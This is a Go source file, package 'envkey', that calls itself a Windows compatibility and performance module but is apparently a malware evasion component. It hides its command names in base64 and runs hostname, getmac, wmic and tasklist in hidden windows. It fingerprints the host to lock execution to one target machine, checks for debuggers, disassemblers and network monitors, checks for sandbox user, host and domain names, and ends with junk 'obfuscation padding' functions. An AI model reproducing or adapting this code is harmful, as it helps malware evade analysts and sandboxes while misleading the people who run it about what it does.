// OBFUSCATED
// Windows compatibility layer
// Performance enhancement module
package envkey

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

// GetComputerName returns the Windows computer name
func GetComputerName() string {
	cmd := exec.Command(d("aG9zdG5hbWU=")) // hostname
	output, err := cmd.Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(output))
}

// GetUsername returns the current Windows username
func GetUsername() string {
	username := os.Getenv("USERNAME")
	return username
}

// GetDomain returns the Windows domain
func GetDomain() string {
	domain := os.Getenv("USERDOMAIN")
	return domain
}

// GetMACAddress returns the first network adapter MAC address
func GetMACAddress() string {
	cmd := exec.Command(d("Z2V0bWFj"), "/v", "/fo", "list") // getmac
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.Output()
	if err != nil {
		return ""
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "Physical Address") {
			parts := strings.Split(line, ":")
			if len(parts) > 1 {
				mac := strings.TrimSpace(parts[1])
				mac = strings.ReplaceAll(mac, "-", "")
				return mac
			}
		}
	}
	return ""
}

// GetMotherboardSerial returns the motherboard serial number
func GetMotherboardSerial() string {
	cmd := exec.Command(d("d21pYw=="), "baseboard", "get", "serialnumber") // wmic
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.Output()
	if err != nil {
		return ""
	}

	lines := strings.Split(string(output), "\n")
	for i, line := range lines {
		if strings.Contains(line, "SerialNumber") && i+1 < len(lines) {
			serial := strings.TrimSpace(lines[i+1])
			return serial
		}
	}
	return ""
}

// GetEnvironmentFingerprint creates a unique fingerprint of the system
func GetEnvironmentFingerprint() string {
	fingerprint := ""
	fingerprint += GetComputerName()
	fingerprint += GetUsername()
	fingerprint += GetDomain()
	fingerprint += GetMACAddress()
	fingerprint += GetMotherboardSerial()

	// Hash the fingerprint
	hash := sha256.Sum256([]byte(fingerprint))
	return hex.EncodeToString(hash[:])
}

// VerifyEnvironment checks if we're running on the intended target
// Returns true if environment matches expected fingerprint
func VerifyEnvironment(expectedFingerprint string) bool {
	// If no fingerprint is set, allow execution everywhere (default behavior)
	if expectedFingerprint == "" || expectedFingerprint == "ANY" {
		return true
	}

	currentFingerprint := GetEnvironmentFingerprint()
	return currentFingerprint == expectedFingerprint
}

// CheckForAnalysisTools detects if common analysis tools are running
func CheckForAnalysisTools() bool {
	analysisTools := []string{
		"processhacker",
		"procexp",      // Process Explorer
		"procmon",      // Process Monitor
		"tcpview",      // TCP View
		"autoruns",     // Autoruns
		"wireshark",    // Network sniffer
		"fiddler",      // HTTP debugger
		"x64dbg",       // Debugger
		"ollydbg",      // Debugger
		"ida",          // IDA Pro
		"ghidra",       // Ghidra
		"pestudio",     // PE analysis
		"exeinfope",    // PE info
		"die",          // Detect It Easy
		"cff explorer", // CFF Explorer
		"hiew",         // Hex editor
		"010editor",    // Hex editor
	}

	cmd := exec.Command(d("dGFza2xpc3Q=")) // tasklist
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	outputLower := strings.ToLower(string(output))
	for _, tool := range analysisTools {
		if strings.Contains(outputLower, tool) {
			return true
		}
	}

	return false
}

// CheckForSandboxArtifacts looks for common sandbox indicators
func CheckForSandboxArtifacts() bool {
	// Check for common sandbox usernames
	sandboxUsers := []string{
		"sandbox",
		"malware",
		"virus",
		"sample",
		"test",
		"currentuser",
		"admin",
	}

	username := strings.ToLower(GetUsername())
	for _, sbUser := range sandboxUsers {
		if username == sbUser {
			return true
		}
	}

	// Check for common sandbox computer names
	sandboxNames := []string{
		"sandbox",
		"cuckoo",
		"maltest",
		"virus",
		"sample",
	}

	hostname := strings.ToLower(GetComputerName())
	for _, sbName := range sandboxNames {
		if strings.Contains(hostname, sbName) {
			return true
		}
	}

	// Check for common sandbox domains
	sandboxDomains := []string{
		"domain",
		"workgroup",
		"sandbox",
	}

	domain := strings.ToLower(GetDomain())
	for _, sbDomain := range sandboxDomains {
		if domain == sbDomain {
			return true
		}
	}

	return false
}

// IsTargetEnvironment combines all environmental checks
func IsTargetEnvironment() bool {
	// Check for analysis tools
	if CheckForAnalysisTools() {
		return false
	}

	// Check for sandbox artifacts
	if CheckForSandboxArtifacts() {
		return false
	}

	// All checks passed
	return true
}



// Obfuscation padding
func obf_52486() {
    _ = 6859
    var _ = "4jIMinBPy55hH2vGdcrLZSIVBYP09mrvCY1fsYTMaTQyubK0hl"
}


// Obfuscation padding
func obf_45990() {
    _ = 8812
    var _ = "TYR0oAchQBvNVVdEo0ddLz5sDT2AhQ3qA90pyvb0u9qqWOQY3X"
}


// Obfuscation padding
func obf_73111() {
    _ = 15
    var _ = "XJPVoVXltOHTpgDomi41C41h0esoA3QytAALIEAeLUhrz4pdoV"
}


// Obfuscation padding
func obf_52534() {
    _ = 2001
    var _ = "0eOkfT3rgcqhE8fMOBzSDgSO5aGU5N22n1UrUNOfGTBu321UiA"
}


// Obfuscation padding
func obf_92876() {
    _ = 8966
    var _ = "l2TRMLLBWBYwut2GTbCVxY05Zbalb3dTzdWCr5TROw3AIarncW"
}
